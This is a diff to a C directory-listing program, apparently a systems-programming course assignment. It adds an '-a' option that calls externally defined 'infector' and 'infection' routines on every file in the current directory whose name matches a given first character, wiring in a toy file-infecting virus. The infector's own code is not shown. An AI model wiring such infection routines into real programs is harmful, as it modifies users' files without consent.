@@ -1,6 +1,8 @@
 #include "util.h"
 #include <dirent.h>
 
+extern void infection(void);
+extern void infector(char*);
 extern int system_call();
 #define SYS_EXIT 1
 #define SYS_READ 3
@@ -34,8 +36,9 @@ struct linux_dirent {
 
 
 int main(int argc, char **argv) {
-    int p = 0;
-    int a = 0;
+    char *prefix;
+    int pFlag = 0;
+    int aFlag = 0;
     char buff[8192];
     struct linux_dirent *d;
     int debug = 0, i;
@@ -47,12 +50,13 @@ int main(int argc, char **argv) {
     for (i = 1; i < argc; i++) {
         /* debug mode - Task 1b */
         if ((strcmp(argv[i], "-D")) == 0) debug = 1;
-        /* read from file - Task 1d */
-        if ((argv[i][0] == '-') & (argv[i][1] == 'p')) p = (argv[i][2]);
-        /* export to file - Task 2 */
-        if ((argv[i][0] == '-') & (argv[i][1] == 'a')) a = (argv[i][2]);
+        /* read from file - Task 1d
+        if ((argv[i][0] == '-') & (argv[i][1] == 'p')) p = positive_atoi(&argv[i][2]); */
+        if ((strncmp(argv[i], "-p", 2)) == 0) {prefix = argv[i] + 2; pFlag = 1;}
+        /* export to file - Task 2 
+        if ((argv[i][0] == '-') & (argv[i][1] == 'a')) a = positive_atoi(&argv[i][2]);*/
+        if ((strncmp(argv[i], "-a", 2)) == 0) {prefix = argv[i] + 2; aFlag = 1;} 
     }
-    
     
     int dir = system_call(SYS_OPEN, ".", O_RDONLY, 0777);
     int dirLoad = system_call(SYS_GETDENTS, dir, buff, 8192);
@@ -60,6 +64,11 @@ int main(int argc, char **argv) {
     if (dirLoad == -1) system_call(SYS_EXIT, 0x55);
 
     for (bpos = 0; bpos < dirLoad;) {
+        system_call(SYS_WRITE, STDOUT, itoa(bpos), 1);
+        system_call(SYS_WRITE, STDOUT, ": ", 2);
+        system_call(SYS_WRITE, STDOUT, itoa(aFlag), 1);
+        system_call(SYS_WRITE, STDOUT, "\n", 1);
+
         d = (struct linux_dirent*) (buff + bpos);
         d_type = *(buff + bpos + d->d_reclen -1);
         d_typeS = (d_type == DT_REG) ?  "regular" :
@@ -69,12 +78,21 @@ int main(int argc, char **argv) {
                     (d_type == DT_LNK) ?  "symlink" :
                     (d_type == DT_BLK) ?  "block dev" :
                     (d_type == DT_CHR) ?  "char dev" : "???";
-        if (p != 0) {
-            if (d->d_name[0] == p) {
+        if (pFlag == 1) {
+            if ((strncmp(d->d_name, prefix, 1)) == 0) {
             system_call(SYS_WRITE, STDOUT, d->d_name, strlen(d->d_name));
             system_call(SYS_WRITE, STDOUT, " ", 1);
             system_call(SYS_WRITE, STDOUT, d_typeS, strlen(d_typeS));
             system_call(SYS_WRITE, STDOUT, "\n", 1);
+            }
+        }
+        else if (aFlag == 1){
+            if ((strncmp(d->d_name, prefix, 1)) == 0) {
+                infector(d->d_name);
+                system_call(SYS_WRITE, STDOUT, d->d_name, strlen(d->d_name));
+                system_call(SYS_WRITE, STDOUT, " ", 1);
+                system_call(SYS_WRITE, STDOUT, d_typeS, strlen(d_typeS));
+                system_call(SYS_WRITE, STDOUT, "\n", 1);
             }
         }
         else {
